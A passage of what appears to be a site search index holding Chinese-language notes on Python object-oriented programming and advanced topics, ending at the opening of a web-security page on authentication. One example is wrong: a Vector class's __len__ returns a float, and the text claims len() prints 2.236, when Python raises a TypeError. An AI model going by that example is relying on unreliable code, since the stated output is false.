Programming\uff0c\u7b80\u79f0OOP\uff09\u662f\u4e00\u79cd\u7f16\u7a0b\u8303\u5f0f\uff0c\u5b83\u5c06\u6570\u636e\uff08\u5c5e\u6027\uff09\u548c\u64cd\u4f5c\u6570\u636e\u7684\u65b9\u6cd5\uff08\u51fd\u6570\uff09\u5c01\u88c5\u5728\u4e00\u4e2a\u79f0\u4e3a\"\u5bf9\u8c61\"\u7684\u5355\u5143\u4e2d\u3002\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u6838\u5fc3\u601d\u60f3\u662f\u4f7f\u7528\u7c7b\uff08Class\uff09\u6765\u5b9a\u4e49\u5bf9\u8c61\u7684\u84dd\u56fe\uff0c\u5e76\u901a\u8fc7\u5b9e\u4f8b\u5316\u7c7b\u6765\u521b\u5efa\u5177\u4f53\u7684\u5bf9\u8c61\u3002</p> <p>Python\u662f\u4e00\u79cd\u9762\u5411\u5bf9\u8c61\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u5b83\u652f\u6301\u7c7b\u3001\u7ee7\u627f\u3001\u591a\u6001\u548c\u5c01\u88c5\u7b49\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u6838\u5fc3\u6982\u5ff5\u3002</p>"},{"location":"python-advanced/oop/#_2","title":"\u7c7b\u4e0e\u5bf9\u8c61","text":""},{"location":"python-advanced/oop/#_3","title":"\u7c7b\u7684\u5b9a\u4e49","text":"<p>\u7c7b\u662f\u5bf9\u8c61\u7684\u84dd\u56fe\u6216\u6a21\u677f\uff0c\u5b83\u5b9a\u4e49\u4e86\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u5728Python\u4e2d\uff0c\u4f7f\u7528<code>class</code>\u5173\u952e\u5b57\u6765\u5b9a\u4e49\u7c7b\uff1a</p> <pre><code>class Person:\n    # \u7c7b\u5c5e\u6027\n    species = \"Homo sapiens\"\n\n    # \u521d\u59cb\u5316\u65b9\u6cd5\uff08\u6784\u9020\u51fd\u6570\uff09\n    def __init__(self, name, age):\n        # \u5b9e\u4f8b\u5c5e\u6027\n        self.name = name\n        self.age = age\n\n    # \u5b9e\u4f8b\u65b9\u6cd5\n    def greet(self):\n        return f\"Hello, my name is {self.name} and I am {self.age} years old.\"\n\n    # \u7c7b\u65b9\u6cd5\n    @classmethod\n    def from_birth_year(cls, name, birth_year):\n        current_year = 2023\n        return cls(name, current_year - birth_year)\n\n    # \u9759\u6001\u65b9\u6cd5\n    @staticmethod\n    def is_adult(age):\n        return age &gt;= 18\n</code></pre>"},{"location":"python-advanced/oop/#_4","title":"\u5bf9\u8c61\u7684\u521b\u5efa\u4e0e\u4f7f\u7528","text":"<p>\u5bf9\u8c61\u662f\u7c7b\u7684\u5b9e\u4f8b\uff0c\u901a\u8fc7\u8c03\u7528\u7c7b\u7684\u6784\u9020\u51fd\u6570\u6765\u521b\u5efa\uff1a</p> <pre><code># \u521b\u5efa\u5bf9\u8c61\nperson1 = Person(\"Alice\", 30)\nperson2 = Person(\"Bob\", 25)\n\n# \u8bbf\u95ee\u5b9e\u4f8b\u5c5e\u6027\nprint(person1.name)  # \u8f93\u51fa: Alice\nprint(person1.age)   # \u8f93\u51fa: 30\n\n# \u8c03\u7528\u5b9e\u4f8b\u65b9\u6cd5\nprint(person1.greet())  # \u8f93\u51fa: Hello, my name is Alice and I am 30 years old.\n\n# \u8bbf\u95ee\u7c7b\u5c5e\u6027\nprint(Person.species)  # \u8f93\u51fa: Homo sapiens\nprint(person1.species)  # \u8f93\u51fa: Homo sapiens\n\n# \u8c03\u7528\u7c7b\u65b9\u6cd5\nperson3 = Person.from_birth_year(\"Charlie\", 1990)\nprint(person3.age)  # \u8f93\u51fa: 33\n\n# \u8c03\u7528\u9759\u6001\u65b9\u6cd5\nprint(Person.is_adult(20))  # \u8f93\u51fa: True\n</code></pre>"},{"location":"python-advanced/oop/#_5","title":"\u7ee7\u627f","text":"<p>\u7ee7\u627f\u662f\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u5b9e\u73b0\u4ee3\u7801\u590d\u7528\u7684\u91cd\u8981\u673a\u5236\uff0c\u5b83\u5141\u8bb8\u4e00\u4e2a\u7c7b\uff08\u5b50\u7c7b\uff09\u7ee7\u627f\u53e6\u4e00\u4e2a\u7c7b\uff08\u7236\u7c7b\uff09\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p>"},{"location":"python-advanced/oop/#_6","title":"\u57fa\u672c\u7ee7\u627f","text":"<pre><code>class Animal:\n    def __init__(self, name):\n        self.name = name\n\n    def speak(self):\n        return \"Some generic sound\"\n\n# Dog\u7c7b\u7ee7\u627f\u81eaAnimal\u7c7b\nclass Dog(Animal):\n    def speak(self):\n        return f\"{self.name} says Woof!\"\n\n# Cat\u7c7b\u7ee7\u627f\u81eaAnimal\u7c7b\nclass Cat(Animal):\n    def speak(self):\n        return f\"{self.name} says Meow!\"\n\n# \u521b\u5efa\u5b50\u7c7b\u5bf9\u8c61\nrover = Dog(\"Rover\")\nwhiskers = Cat(\"Whiskers\")\n\n# \u8c03\u7528\u7ee7\u627f\u7684\u65b9\u6cd5\nprint(rover.speak())  # \u8f93\u51fa: Rover says Woof!\nprint(whiskers.speak())  # \u8f93\u51fa: Whiskers says Meow!\n</code></pre>"},{"location":"python-advanced/oop/#_7","title":"\u65b9\u6cd5\u91cd\u5199","text":"<p>\u5b50\u7c7b\u53ef\u4ee5\u91cd\u5199\u7236\u7c7b\u7684\u65b9\u6cd5\uff0c\u4ee5\u63d0\u4f9b\u81ea\u5df1\u7684\u5b9e\u73b0\uff1a</p> <pre><code>class Employee:\n    def __init__(self, name, salary):\n        self.name = name\n        self.salary = salary\n\n    def calculate_bonus(self):\n        return self.salary * 0.1\n\nclass Manager(Employee):\n    def calculate_bonus(self):\n        # \u91cd\u5199\u7236\u7c7b\u65b9\u6cd5\uff0c\u7ecf\u7406\u83b7\u5f97\u66f4\u9ad8\u7684\u5956\u91d1\n        return self.salary * 0.2\n\n# \u521b\u5efa\u5bf9\u8c61\nemp = Employee(\"Alice\", 50000)\nmanager = Manager(\"Bob\", 80000)\n\n# \u8c03\u7528\u91cd\u5199\u7684\u65b9\u6cd5\nprint(emp.calculate_bonus())  # \u8f93\u51fa: 5000.0\nprint(manager.calculate_bonus())  # \u8f93\u51fa: 16000.0\n</code></pre>"},{"location":"python-advanced/oop/#super","title":"super()\u51fd\u6570","text":"<p><code>super()</code>\u51fd\u6570\u7528\u4e8e\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\uff0c\u901a\u5e38\u7528\u4e8e\u5728\u5b50\u7c7b\u4e2d\u6269\u5c55\u7236\u7c7b\u7684\u529f\u80fd\uff1a</p> <pre><code>class Parent:\n    def __init__(self, name):\n        self.name = name\n\n    def greet(self):\n        return f\"Hello, I am {self.name}\"\n\nclass Child(Parent):\n    def __init__(self, name, age):\n        # \u8c03\u7528\u7236\u7c7b\u7684\u521d\u59cb\u5316\u65b9\u6cd5\n        super().__init__(name)\n        self.age = age\n\n    def greet(self):\n        # \u6269\u5c55\u7236\u7c7b\u7684greet\u65b9\u6cd5\n        parent_greeting = super().greet()\n        return f\"{parent_greeting} and I am {self.age} years old\"\n\nchild = Child(\"Charlie\", 5)\nprint(child.greet())  # \u8f93\u51fa: Hello, I am Charlie and I am 5 years old\n</code></pre>"},{"location":"python-advanced/oop/#_8","title":"\u591a\u91cd\u7ee7\u627f","text":"<p>Python\u652f\u6301\u591a\u91cd\u7ee7\u627f\uff0c\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u7ee7\u627f\u81ea\u591a\u4e2a\u7236\u7c7b\uff1a</p> <pre><code>class Flyable:\n    def fly(self):\n        return \"Flying...\"\n\nclass Swimmable:\n    def swim(self):\n        return \"Swimming...\"\n\n# Duck\u7c7b\u7ee7\u627f\u81eaFlyable\u548cSwimmable\nclass Duck(Flyable, Swimmable):\n    pass\n\nduck = Duck()\nprint(duck.fly())  # \u8f93\u51fa: Flying...\nprint(duck.swim())  # \u8f93\u51fa: Swimming...\n</code></pre> <p>\u6ce8\u610f\uff1a\u591a\u91cd\u7ee7\u627f\u53ef\u80fd\u5bfc\u81f4\u83f1\u5f62\u7ee7\u627f\u95ee\u9898\uff08\u94bb\u77f3\u95ee\u9898\uff09\uff0cPython\u901a\u8fc7C3\u7ebf\u6027\u5316\u7b97\u6cd5\uff08\u65b9\u6cd5\u89e3\u6790\u987a\u5e8f\uff0cMRO\uff09\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p>"},{"location":"python-advanced/oop/#_9","title":"\u591a\u6001","text":"<p>\u591a\u6001\u662f\u6307\u4e0d\u540c\u7c7b\u578b\u7684\u5bf9\u8c61\u53ef\u4ee5\u54cd\u5e94\u76f8\u540c\u7684\u65b9\u6cd5\u8c03\u7528\uff0c\u4f46\u53ef\u80fd\u6709\u4e0d\u540c\u7684\u884c\u4e3a\u3002\u5728Python\u4e2d\uff0c\u591a\u6001\u662f\u901a\u8fc7\u52a8\u6001\u7c7b\u578b\u7cfb\u7edf\u5b9e\u73b0\u7684\u3002</p> <pre><code>class Shape:\n    def area(self):\n        pass\n\nclass Rectangle(Shape):\n    def __init__(self, width, height):\n        self.width = width\n        self.height = height\n\n    def area(self):\n        return self.width * self.height\n\nclass Circle(Shape):\n    def __init__(self, radius):\n        self.radius = radius\n\n    def area(self):\n        import math\n        return math.pi * self.radius ** 2\n\n# \u591a\u6001\u793a\u4f8b\uff1a\u4e0d\u540c\u7c7b\u578b\u7684\u5bf9\u8c61\u54cd\u5e94\u76f8\u540c\u7684\u65b9\u6cd5\nshapes = [Rectangle(5, 4), Circle(3)]\n\nfor shape in shapes:\n    print(f\"Area: {shape.area()}\")\n    # \u8f93\u51fa:\n    # Area: 20\n    # Area: 28.274333882308138\n</code></pre>"},{"location":"python-advanced/oop/#_10","title":"\u5c01\u88c5","text":"<p>\u5c01\u88c5\u662f\u6307\u5c06\u6570\u636e\uff08\u5c5e\u6027\uff09\u548c\u64cd\u4f5c\u6570\u636e\u7684\u65b9\u6cd5\uff08\u51fd\u6570\uff09\u5c01\u88c5\u5728\u4e00\u4e2a\u5355\u5143\u4e2d\uff0c\u5e76\u63a7\u5236\u5bf9\u5176\u7684\u8bbf\u95ee\u3002\u5728Python\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u547d\u540d\u7ea6\u5b9a\u548c\u5c5e\u6027\u88c5\u9970\u5668\u6765\u5b9e\u73b0\u5c01\u88c5\u3002</p>"},{"location":"python-advanced/oop/#_11","title":"\u79c1\u6709\u5c5e\u6027\u548c\u65b9\u6cd5","text":"<p>Python\u6ca1\u6709\u771f\u6b63\u7684\u79c1\u6709\u5c5e\u6027\u6216\u65b9\u6cd5\uff0c\u4f46\u6709\u4e00\u4e2a\u547d\u540d\u7ea6\u5b9a\uff1a\u4ee5\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u5c5e\u6027\u6216\u65b9\u6cd5\u88ab\u8ba4\u4e3a\u662f\u79c1\u6709\u7684\uff0c\u4e0d\u5e94\u8be5\u5728\u7c7b\u5916\u90e8\u76f4\u63a5\u8bbf\u95ee\uff1a</p> <pre><code>class Car:\n    def __init__(self, brand, model, year):\n        self.brand = brand  # \u516c\u5171\u5c5e\u6027\n        self._model = model  # \u4fdd\u62a4\u5c5e\u6027\uff08\u7ea6\u5b9a\uff09\n        self.__year = year  # \u79c1\u6709\u5c5e\u6027\uff08\u540d\u79f0\u4fee\u9970\uff09\n\n    def get_year(self):\n        return self.__year\n\n    def _start_engine(self):  # \u4fdd\u62a4\u65b9\u6cd5\n        return \"Engine started\"\n\n    def __private_method(self):  # \u79c1\u6709\u65b9\u6cd5\n        return \"This is a private method\"\n\ncar = Car(\"Toyota\", \"Corolla\", 2020)\n\nprint(car.brand)  # \u53ef\u4ee5\u8bbf\u95ee\uff0c\u8f93\u51fa: Toyota\nprint(car._model)  # \u53ef\u4ee5\u8bbf\u95ee\uff08\u4f46\u4e0d\u63a8\u8350\uff09\uff0c\u8f93\u51fa: Corolla\n# print(car.__year)  # \u9519\u8bef\uff1a\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u79c1\u6709\u5c5e\u6027\n\nprint(car.get_year())  # \u8f93\u51fa: 2020\nprint(car._start_engine())  # \u53ef\u4ee5\u8c03\u7528\uff08\u4f46\u4e0d\u63a8\u8350\uff09\uff0c\u8f93\u51fa: Engine started\n# print(car.__private_method())  # \u9519\u8bef\uff1a\u65e0\u6cd5\u76f4\u63a5\u8c03\u7528\u79c1\u6709\u65b9\u6cd5\n\n# \u6ce8\u610f\uff1aPython\u7684\u540d\u79f0\u4fee\u9970\u4f7f\u5f97\u79c1\u6709\u5c5e\u6027\u53ef\u4ee5\u901a\u8fc7\u7279\u6b8a\u540d\u79f0\u8bbf\u95ee\nprint(car._Car__year)  # \u8f93\u51fa: 2020\nprint(car._Car__private_method())  # \u8f93\u51fa: This is a private method\n</code></pre>"},{"location":"python-advanced/oop/#_12","title":"\u5c5e\u6027\u88c5\u9970\u5668","text":"<p>Python\u63d0\u4f9b\u4e86<code>@property</code>\u3001<code>@&lt;attribute&gt;.setter</code>\u548c<code>@&lt;attribute&gt;.deleter</code>\u88c5\u9970\u5668\u6765\u5b9a\u4e49\u5c5e\u6027\u7684getter\u3001setter\u548cdeleter\u65b9\u6cd5\uff1a</p> <pre><code>class Person:\n    def __init__(self, name, age):\n        self._name = name\n        self._age = age\n\n    @property\n    def name(self):\n        return self._name\n\n    @property\n    def age(self):\n        return self._age\n\n    @age.setter\n    def age(self, value):\n        if value &lt; 0:\n            raise ValueError(\"Age cannot be negative\")\n        self._age = value\n\n    @age.deleter\n    def age(self):\n        del self._age\n\nperson = Person(\"Alice\", 30)\n\n# \u4f7f\u7528property\u88c5\u9970\u5668\u7684getter\nprint(person.name)  # \u8f93\u51fa: Alice\nprint(person.age)  # \u8f93\u51fa: 30\n\n# \u4f7f\u7528setter\u8bbe\u7f6e\u503c\nperson.age = 31\nprint(person.age)  # \u8f93\u51fa: 31\n\n# \u5c1d\u8bd5\u8bbe\u7f6e\u65e0\u6548\u503c\n# person.age = -5  # \u629b\u51faValueError\u5f02\u5e38\n\n# \u4f7f\u7528deleter\u5220\u9664\u5c5e\u6027\ndel person.age\n# print(person.age)  # \u629b\u51faAttributeError\u5f02\u5e38\n</code></pre>"},{"location":"python-advanced/oop/#_13","title":"\u7279\u6b8a\u65b9\u6cd5","text":"<p>Python\u4e2d\u7684\u7279\u6b8a\u65b9\u6cd5\uff08\u4e5f\u79f0\u4e3a\u9b54\u672f\u65b9\u6cd5\u6216\u53cc\u4e0b\u5212\u7ebf\u65b9\u6cd5\uff09\u662f\u4ee5\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u548c\u7ed3\u5c3e\u7684\u65b9\u6cd5\uff0c\u5b83\u4eec\u7528\u4e8e\u5b9e\u73b0\u5bf9\u8c61\u7684\u7279\u6b8a\u884c\u4e3a\u3002</p>"},{"location":"python-advanced/oop/#_14","title":"\u5e38\u7528\u7684\u7279\u6b8a\u65b9\u6cd5","text":"<pre><code>class Vector:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n    # \u5b57\u7b26\u4e32\u8868\u793a\n    def __str__(self):\n        return f\"Vector({self.x}, {self.y})\"\n\n    def __repr__(self):\n        return f\"Vector({self.x}, {self.y})\"\n\n    # \u7b97\u672f\u8fd0\u7b97\u7b26\u91cd\u8f7d\n    def __add__(self, other):\n        if isinstance(other, Vector):\n            return Vector(self.x + other.x, self.y + other.y)\n        raise TypeError(\"Can only add Vector to Vector\")\n\n    def __sub__(self, other):\n        if isinstance(other, Vector):\n            return Vector(self.x - other.x, self.y - other.y)\n        raise TypeError(\"Can only subtract Vector from Vector\")\n\n    def __mul__(self, scalar):\n        return Vector(self.x * scalar, self.y * scalar)\n\n    # \u6bd4\u8f83\u8fd0\u7b97\u7b26\u91cd\u8f7d\n    def __eq__(self, other):\n        if isinstance(other, Vector):\n            return self.x == other.x and self.y == other.y\n        return False\n\n    # \u5bb9\u5668\u884c\u4e3a\n    def __len__(self):\n        # \u8fd4\u56de\u5411\u91cf\u7684\u957f\u5ea6\uff08\u6b27\u51e0\u91cc\u5f97\u8303\u6570\uff09\n        import math\n        return math.sqrt(self.x**2 + self.y**2)\n\n    def __getitem__(self, key):\n        if key == 0:\n            return self.x\n        elif key == 1:\n            return self.y\n        raise IndexError(\"Vector index out of range\")\n\n# \u4f7f\u7528\u7279\u6b8a\u65b9\u6cd5\nv1 = Vector(1, 2)\nv2 = Vector(3, 4)\n\n# \u5b57\u7b26\u4e32\u8868\u793a\nprint(str(v1))  # \u8f93\u51fa: Vector(1, 2)\nprint(repr(v1))  # \u8f93\u51fa: Vector(1, 2)\n\n# \u7b97\u672f\u8fd0\u7b97\nv3 = v1 + v2\nprint(v3)  # \u8f93\u51fa: Vector(4, 6)\n\nv4 = v2 - v1\nprint(v4)  # \u8f93\u51fa: Vector(2, 2)\n\nv5 = v1 * 2\nprint(v5)  # \u8f93\u51fa: Vector(2, 4)\n\n# \u6bd4\u8f83\nprint(v1 == v2)  # \u8f93\u51fa: False\nprint(v1 == Vector(1, 2))  # \u8f93\u51fa: True\n\n# \u5bb9\u5668\u884c\u4e3a\nprint(len(v1))  # \u8f93\u51fa: 2.23606797749979\nprint(v1[0])  # \u8f93\u51fa: 1\nprint(v1[1])  # \u8f93\u51fa: 2\n</code></pre>"},{"location":"python-advanced/oop/#oop","title":"\u8bbe\u8ba1\u6a21\u5f0f\u4e0eOOP","text":"<p>\u8bbe\u8ba1\u6a21\u5f0f\u662f\u5728\u8f6f\u4ef6\u5f00\u53d1\u4e2d\u89e3\u51b3\u5e38\u89c1\u95ee\u9898\u7684\u53ef\u91cd\u7528\u65b9\u6848\u3002\u8bb8\u591a\u8bbe\u8ba1\u6a21\u5f0f\u5229\u7528\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u7279\u6027\u6765\u5b9e\u73b0\u3002</p>"},{"location":"python-advanced/oop/#_15","title":"\u5355\u4f8b\u6a21\u5f0f","text":"<p>\u786e\u4fdd\u4e00\u4e2a\u7c7b\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u5e76\u63d0\u4f9b\u4e00\u4e2a\u5168\u5c40\u8bbf\u95ee\u70b9\u3002</p> <pre><code>class Singleton:\n    _instance = None\n\n    def __new__(cls, *args, **kwargs):\n        if cls._instance is None:\n            cls._instance = super().__new__(cls)\n        return cls._instance\n\n# \u6d4b\u8bd5\u5355\u4f8b\u6a21\u5f0f\ns1 = Singleton()\ns2 = Singleton()\n\nprint(s1 is s2)  # \u8f93\u51fa: True\n</code></pre>"},{"location":"python-advanced/oop/#_16","title":"\u5de5\u5382\u6a21\u5f0f","text":"<p>\u63d0\u4f9b\u4e00\u4e2a\u521b\u5efa\u5bf9\u8c61\u7684\u63a5\u53e3\uff0c\u8ba9\u5b50\u7c7b\u51b3\u5b9a\u5b9e\u4f8b\u5316\u54ea\u4e2a\u7c7b\u3002</p> <pre><code>class Animal:\n    def speak(self):\n        pass\n\nclass Dog(Animal):\n    def speak(self):\n        return \"Woof!\"\n\nclass Cat(Animal):\n    def speak(self):\n        return \"Meow!\"\n\nclass AnimalFactory:\n    @staticmethod\n    def create_animal(animal_type):\n        if animal_type == \"dog\":\n            return Dog()\n        elif animal_type == \"cat\":\n            return Cat()\n        else:\n            raise ValueError(f\"Unknown animal type: {animal_type}\")\n\n# \u4f7f\u7528\u5de5\u5382\u6a21\u5f0f\ndog = AnimalFactory.create_animal(\"dog\")\ncat = AnimalFactory.create_animal(\"cat\")\n\nprint(dog.speak())  # \u8f93\u51fa: Woof!\nprint(cat.speak())  # \u8f93\u51fa: Meow!\n</code></pre>"},{"location":"python-advanced/oop/#_17","title":"\u603b\u7ed3","text":"<p>\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u662fPython\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u7f16\u7a0b\u8303\u5f0f\uff0c\u5b83\u901a\u8fc7\u7c7b\u548c\u5bf9\u8c61\u7684\u6982\u5ff5\uff0c\u5e2e\u52a9\u5f00\u53d1\u8005\u66f4\u597d\u5730\u7ec4\u7ec7\u548c\u7ba1\u7406\u4ee3\u7801\u3002\u7406\u89e3\u5e76\u719f\u7ec3\u5e94\u7528\u7c7b\u3001\u7ee7\u627f\u3001\u591a\u6001\u548c\u5c01\u88c5\u7b49\u6838\u5fc3\u6982\u5ff5\uff0c\u4ee5\u53ca\u638c\u63e1\u7279\u6b8a\u65b9\u6cd5\u548c\u5e38\u7528\u8bbe\u8ba1\u6a21\u5f0f\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5f00\u53d1\u8005\u7f16\u5199\u66f4\u52a0\u4f18\u96c5\u3001\u9ad8\u6548\u548c\u53ef\u7ef4\u62a4\u7684Python\u4ee3\u7801\u3002</p>"},{"location":"python-advanced/overview/","title":"Python\u9ad8\u7ea7\u7f16\u7a0b\u6982\u8ff0","text":""},{"location":"python-advanced/overview/#python_1","title":"\u4ec0\u4e48\u662fPython\u9ad8\u7ea7\u7f16\u7a0b\uff1f","text":"<p>Python\u9ad8\u7ea7\u7f16\u7a0b\u6db5\u76d6\u4e86Python\u8bed\u8a00\u4e2d\u8f83\u4e3a\u590d\u6742\u548c\u5f3a\u5927\u7684\u7279\u6027\uff0c\u8fd9\u4e9b\u7279\u6027\u901a\u5e38\u7528\u4e8e\u89e3\u51b3\u66f4\u590d\u6742\u7684\u7f16\u7a0b\u95ee\u9898\uff0c\u63d0\u9ad8\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u3001\u53ef\u7ef4\u62a4\u6027\u548c\u6027\u80fd\u3002\u638c\u63e1\u8fd9\u4e9b\u9ad8\u7ea7\u7279\u6027\u53ef\u4ee5\u5e2e\u52a9\u5f00\u53d1\u8005\u7f16\u5199\u66f4\u52a0\u4f18\u96c5\u3001\u9ad8\u6548\u7684Python\u4ee3\u7801\u3002</p>"},{"location":"python-advanced/overview/#python_2","title":"\u672c\u7b14\u8bb0\u5e93\u6db5\u76d6\u7684Python\u9ad8\u7ea7\u4e3b\u9898","text":"<p>\u672c\u90e8\u5206\u5c06\u8be6\u7ec6\u4ecb\u7ecd\u4ee5\u4e0b\u51e0\u4e2a\u91cd\u8981\u7684Python\u9ad8\u7ea7\u7f16\u7a0b\u4e3b\u9898\uff1a</p>"},{"location":"python-advanced/overview/#oop","title":"\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b (OOP)","text":"<p>\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u662f\u4e00\u79cd\u7f16\u7a0b\u8303\u5f0f\uff0c\u5c06\u6570\u636e\u548c\u64cd\u4f5c\u6570\u636e\u7684\u65b9\u6cd5\u5c01\u88c5\u5728\u5bf9\u8c61\u4e2d\u3002Python\u662f\u4e00\u79cd\u9762\u5411\u5bf9\u8c61\u7684\u7f16\u7a0b\u8bed\u8a00\uff0c\u652f\u6301\u7c7b\u3001\u7ee7\u627f\u3001\u591a\u6001\u7b49OOP\u7279\u6027\u3002</p>"},{"location":"python-advanced/overview/#_1","title":"\u591a\u7ebf\u7a0b\u7f16\u7a0b","text":"<p>Python\u4e2d\u7684\u591a\u7ebf\u7a0b\u7f16\u7a0b\u5141\u8bb8\u7a0b\u5e8f\u5e76\u53d1\u6267\u884c\u591a\u4e2a\u4efb\u52a1\uff0c\u63d0\u9ad8\u7a0b\u5e8f\u7684\u6027\u80fd\u548c\u54cd\u5e94\u6027\u3002Python\u63d0\u4f9b\u4e86<code>threading</code>\u6a21\u5757\u6765\u652f\u6301\u591a\u7ebf\u7a0b\u7f16\u7a0b\u3002</p>"},{"location":"python-advanced/overview/#_2","title":"\u534f\u7a0b\u4e0e\u5f02\u6b65\u7f16\u7a0b","text":"<p>\u534f\u7a0b\u662f\u4e00\u79cd\u6bd4\u7ebf\u7a0b\u66f4\u8f7b\u91cf\u7ea7\u7684\u5e76\u53d1\u7f16\u7a0b\u65b9\u5f0f\uff0cPython 3.5\u5f15\u5165\u4e86<code>async/await</code>\u8bed\u6cd5\uff0c\u7ed3\u5408<code>asyncio</code>\u6a21\u5757\uff0c\u4f7f\u5f97\u5f02\u6b65\u7f16\u7a0b\u53d8\u5f97\u66f4\u52a0\u7b80\u5355\u548c\u76f4\u89c2\u3002</p>"},{"location":"python-advanced/overview/#_3","title":"\u5e76\u53d1\u7f16\u7a0b\u6700\u4f73\u5b9e\u8df5","text":"<p>\u5728Python\u4e2d\u8fdb\u884c\u5e76\u53d1\u7f16\u7a0b\u65f6\uff0c\u9700\u8981\u6ce8\u610fGIL\uff08\u5168\u5c40\u89e3\u91ca\u5668\u9501\uff09\u7b49\u7279\u6027\u5e26\u6765\u7684\u9650\u5236\uff0c\u672c\u90e8\u5206\u5c06\u4ecb\u7ecd\u5982\u4f55\u5728\u8fd9\u4e9b\u9650\u5236\u4e0b\u5b9e\u73b0\u9ad8\u6548\u7684\u5e76\u53d1\u7f16\u7a0b\u3002</p>"},{"location":"python-advanced/overview/#python_3","title":"Python\u9ad8\u7ea7\u7f16\u7a0b\u7684\u91cd\u8981\u6027","text":"<p>\u638c\u63e1Python\u9ad8\u7ea7\u7f16\u7a0b\u6280\u672f\u5bf9\u4e8e\u4ee5\u4e0b\u65b9\u9762\u81f3\u5173\u91cd\u8981\uff1a</p> <ol> <li>\u4ee3\u7801\u8d28\u91cf\uff1a\u9ad8\u7ea7\u7279\u6027\u53ef\u4ee5\u5e2e\u52a9\u7f16\u5199\u66f4\u7b80\u6d01\u3001\u66f4\u6613\u7ef4\u62a4\u7684\u4ee3\u7801</li> <li>\u6027\u80fd\u4f18\u5316\uff1a\u5408\u7406\u4f7f\u7528\u5e76\u53d1\u548c\u5f02\u6b65\u53ef\u4ee5\u663e\u8457\u63d0\u9ad8\u7a0b\u5e8f\u6027\u80fd</li> <li>\u590d\u6742\u95ee\u9898\u89e3\u51b3\uff1a\u67d0\u4e9b\u9ad8\u7ea7\u7279\u6027\u7279\u522b\u9002\u5408\u89e3\u51b3\u7279\u5b9a\u9886\u57df\u7684\u590d\u6742\u95ee\u9898</li> <li>\u804c\u4e1a\u53d1\u5c55\uff1a\u6df1\u5165\u7406\u89e3Python\u9ad8\u7ea7\u7279\u6027\u662f\u6210\u4e3a\u4e13\u4e1aPython\u5f00\u53d1\u8005\u7684\u91cd\u8981\u4e00\u6b65</li> </ol>"},{"location":"python-advanced/overview/#_4","title":"\u5b66\u4e60\u5efa\u8bae","text":"<ol> <li>\u5faa\u5e8f\u6e10\u8fdb\uff1a\u4ece\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u5f00\u59cb\uff0c\u9010\u6b65\u8fc7\u6e21\u5230\u5e76\u53d1\u548c\u5f02\u6b65\u7f16\u7a0b</li> <li>\u5b9e\u8df5\u4e3a\u4e3b\uff1a\u901a\u8fc7\u5b9e\u9645\u9879\u76ee\u548c\u7ec3\u4e60\u6765\u5de9\u56fa\u6240\u5b66\u77e5\u8bc6</li> <li>\u9605\u8bfb\u6e90\u7801\uff1a\u5b66\u4e60\u4f18\u79c0\u5f00\u6e90\u9879\u76ee\u7684\u4ee3\u7801\uff0c\u4e86\u89e3\u9ad8\u7ea7\u7279\u6027\u7684\u5b9e\u9645\u5e94\u7528</li> <li>\u5173\u6ce8\u6700\u4f73\u5b9e\u8df5\uff1a\u4e86\u89e3Python\u793e\u533a\u63a8\u8350\u7684\u7f16\u7801\u98ce\u683c\u548c\u5b9e\u8df5</li> </ol> <p>\u63a5\u4e0b\u6765\uff0c\u8ba9\u6211\u4eec\u5f00\u59cb\u63a2\u7d22Python\u9ad8\u7ea7\u7f16\u7a0b\u7684\u5404\u4e2a\u4e3b\u9898\u3002</p>"},{"location":"web-security/authentication/","title":"\u8ba4\u8bc1\u4e0e\u6388\u6743 (Authentication and Authorization)","text":""},{"location":"web-security/authentication/#_1","title":"\u4ec0\u4e48\u662f\u8ba4\u8bc1\u4e0e\u6388\u6743\uff1f","text":"<p>\u8ba4\u8bc1\uff08Authentication\uff09\u662f\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u7684\u8fc7\u7a0b\uff0c\u786e\u5b9a\u7528\u6237\u662f\u5426\u662f\u5176\u58f0\u79f0\u7684\u8eab\u4efd\u3002\u6388\u6743\uff08Authorization\uff09\u662f\u786e\u5b9a\u5df2\u8ba4\u8bc1\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u54ea\u4e9b\u8d44\u6e90\u548c\u6267\u884c\u54ea\u4e9b\u64cd\u4f5c\u7684\u8fc7\u7a0b\u3002</p> <p>\u8ba4\u8bc1\u4e0e\u6388\u6743\u662fWeb\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u7684\u6838\u5fc3\u7ec4\u6210\u90e8\u5206\uff0c\u5b9e\u73b0\u4e0d\u5f53\u53ef\u80fd\u5bfc\u81f4\u672a\u6388\u6743\u8bbf\u95ee\u3001\u6743\u9650\u63d0\u5347\u7b49\u4e25\u91cd\u5b89\u5168\u95ee\u9898\u3002</p>"},{"location":"web-security/authentication/#_2","title":"\u5e38\u89c1\u7684\u8ba4\u8bc1\u6f0f\u6d1e","text":""},{"location":"web-security/authentication/#1","title":"1. \u5f31\u5bc6\u7801\u7b56\u7565","text":"<p>\u95ee\u9898\uff1a\u5141\u8bb8\u7528\u6237\u8bbe\u7f6e\u5bb9\u6613\u88ab\u731c\u6d4b\u6216\u7834\u89e3\u7684\u5bc6\u7801\u3002</p> 